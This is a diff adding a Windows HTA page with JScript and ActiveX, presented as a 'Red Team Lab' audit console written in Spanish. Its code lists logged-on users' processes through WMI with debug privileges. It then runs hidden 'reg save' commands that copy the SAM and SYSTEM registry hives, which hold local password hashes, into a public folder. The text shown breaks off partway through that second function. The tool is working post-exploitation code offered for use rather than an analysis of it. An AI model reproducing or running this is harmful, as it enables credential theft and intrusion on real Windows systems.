@@ -1,0 +1,67 @@
+<html>
+<head>
+<title>Consola de Auditoria Final - Red Team Lab</title>
+<style>
+    body { background: #050505; color: #00ff00; font-family: 'Consolas', 'Courier New', monospace; padding: 15px; }
+    .panel { border: 1px solid #00ff00; padding: 10px; margin-bottom: 15px; background: #111; }
+    h3 { color: #00ccff; margin-top: 0; border-bottom: 1px solid #444; }
+    #output { 
+        width: 100%; height: 300px; background: #000; color: #33ff33; 
+        border: 1px solid #222; padding: 10px; overflow-y: scroll;
+        font-size: 12px; line-height: 1.4;
+    }
+    button { 
+        background: #004400; color: #00ff00; border: 1px solid #00ff00; 
+        padding: 5px 15px; cursor: pointer; margin: 2px;
+    }
+    button:hover { background: #00ff00; color: #000; }
+    input { background: #000; color: #00ff00; border: 1px solid #333; padding: 3px; }
+    .error { color: #ff4444; }
+    .success { color: #ffff00; }
+</style>
+
+<script language="JScript">
+    var fso = new ActiveXObject("Scripting.FileSystemObject");
+    var shell = new ActiveXObject("WScript.Shell");
+
+    function log(msg, color) {
+        var div = document.getElementById("output");
+        var span = document.createElement("span");
+        if (color) span.style.color = color;
+        span.innerHTML = msg + "<br>";
+        div.appendChild(span);
+        div.scrollTop = div.scrollHeight;
+    }
+
+    // --- 1. ENUMERACIÓN DE SESIONES (CORREGIDA) ---
+    function enumerarSesiones() {
+        var out = document.getElementById("output");
+        out.innerHTML = "<b>[+] Iniciando escaneo de sesiones activas...</b><br>";
+        try {
+            var wmi = GetObject("winmgmts:{impersonationLevel=impersonate,(Debug)}!\\\\.\\root\\cimv2");
+            var colProcs = wmi.ExecQuery("Select * from Win32_Process");
+            var e = new Enumerator(colProcs);
+            
+            while (!e.atEnd()) {
+                var p = e.item();
+                var user = { value: "" }, domain = { value: "" };
+                var res = p.GetOwner(user, domain);
+                
+                if (res === 0) {
+                    var full = domain.value + "\\" + user.value;
+                    if (user.value !== "SYSTEM" && user.value !== "LOCAL SERVICE" && user.value !== "NETWORK SERVICE") {
+                        log(full + " | <b>" + p.Name + "</b> (PID: " + p.Handle + ")");
+                    }
+                }
+                e.moveNext();
+            }
+        } catch (err) { log("Error: " + err.message, "#ff4444"); }
+    }
+
+    // --- 2. EXTRACCIÓN DE REGISTRO (HIVES) ---
+    function volcarRegistro() {
+        log("[!] Intentando volcado de Hives (SAM/SYSTEM)...");
+        var path = "C:\\Users\\Public\\";
+        try {
+            shell.Run("reg save HKLM\\SAM " + path + "s.dat /y", 0, true);
+            shell.Run("reg save H
